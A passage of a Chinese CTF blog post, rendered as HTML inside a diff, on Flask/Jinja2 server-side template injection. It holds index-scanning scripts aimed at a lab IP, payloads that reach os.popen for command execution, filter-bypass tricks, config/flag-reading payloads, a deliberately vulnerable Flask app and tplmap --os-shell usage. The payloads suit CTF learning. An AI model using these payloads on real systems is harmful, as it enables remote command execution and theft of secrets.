class="string">&quot;http://61.147.171.105:63900/&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os.py&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">       <span class="built_in">print</span>(i)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload:&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="查找importlib类"><a href="#查找importlib类" class="headerlink" title="查找importlib类"></a>查找importlib类</h3><p>Python 中存在 &lt;class ‘_frozen_importlib.BuiltinImporter’&gt; 类，目的就是提供 Python 中 import 语句的实现（以及 <strong>import</strong> 函数）。我么可以直接利用该类中的load_module将os模块导入，从而使用 os 模块执行命令。</p>
+<p>也可以搜索__import__函数来导入os模块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://61.147.171.105:63900/&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;__import__&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">       <span class="built_in">print</span>(i)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload:&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="类的总结"><a href="#类的总结" class="headerlink" title="类的总结"></a>类的总结</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each <span class="keyword">class</span> <span class="title class_">keeps</span> a <span class="built_in">list</span> of weak references to its immediate subclasses. This method returns a <span class="built_in">list</span> of <span class="built_in">all</span> those references still alive. The <span class="built_in">list</span> <span class="keyword">is</span> <span class="keyword">in</span> definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[<span class="string">&#x27;b&#x27;</span>]，就是a.__getitem__(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身如<span class="built_in">eval</span>()函数。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line"><span class="built_in">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls&#x27;</span>).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取<span class="built_in">open</span>函数:request.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/proc\self\fd/3&#x27;</span>).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-<span class="type">Type</span>:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-<span class="type">Type</span>:a/b)</span><br><span class="line">request.json		 post传json  (Content-<span class="type">Type</span>: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of <span class="string">&#x27;flask_ssti&#x27;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a>过滤[]</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">138</span>).__init__.__globals__.get(<span class="string">&#x27;popen&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用config读取flag"><a href="#利用config读取flag" class="headerlink" title="利用config读取flag"></a>利用config读取flag</h3><p>如果flag是利用app.config[‘flag’]&#x3D;’*******’ 进行配置的</p>
+<p>则可以利用来读取</p>
+<p>或者</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;self.<span class="built_in">dict</span>.__TemplateReference__context.config&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[<span class="string">&#x27;json&#x27;</span>].JSONEncoder.default.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>简单的ssti漏洞代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    app.config[<span class="string">&#x27;flag&#x27;</span>] = <span class="string">&#x27;sdhgfdfsdhfjsgfs&#x27;</span></span><br><span class="line">    templates=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Title&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">        &#123;&#125;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(request.args.get(<span class="string">&#x27;key&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(templates)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>使用括号进行绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;dir&#x27;</span>).read()&#125;&#125; </span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">138</span>].__init__.__globals__.get(request.args.func)(request.args.cmd).read()&#125;&#125;&amp;func=popen&amp;cmd=<span class="built_in">dir</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__getattribute__(<span class="string">&#x27;__&#x27;</span>+<span class="string">&quot;cl&quot;</span>+<span class="string">&quot;ass&quot;</span>+<span class="string">&#x27;__&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="TPLMAP的使用"><a href="#TPLMAP的使用" class="headerlink" title="TPLMAP的使用"></a>TPLMAP的使用</h2><p>下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/epinna/tplmap.git</span><br></pre></td></tr></table></figure>
+
+<p>安装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tplmap.py -u &quot;url/?key=111*&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获取shell</span></span><br><span class="line">python2 tplmap.py -u url?flag --os-shell</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看目录</span></span><br><span class="line">ls</span><br><span class="line"></span><br><span class="line"><span class="comment">#发现flag文件，打开</span></span><br><span class="line">cat flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/03/16/SSTI/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2023/03/15/RCE/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">RCE</div>
+      </a>
+    
+  </nav>
+
+  
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023
+        <i class="ri-heart-fill heart_icon"></i> f14g
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/favicon.ico" alt="CTF"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/me">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+ <script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js"></script>
+<script src="https://cdn.staticfile.org/mathjax/2.7.7/config/TeX-AMS-MML_HTMLorMML-full.js"></script>
+<script>
+  var ayerConfig = {
+    mathjax: true,
+  };
+</script>
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+ 
+<script src="/js/clickBoom2.js"></script>
+ 
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
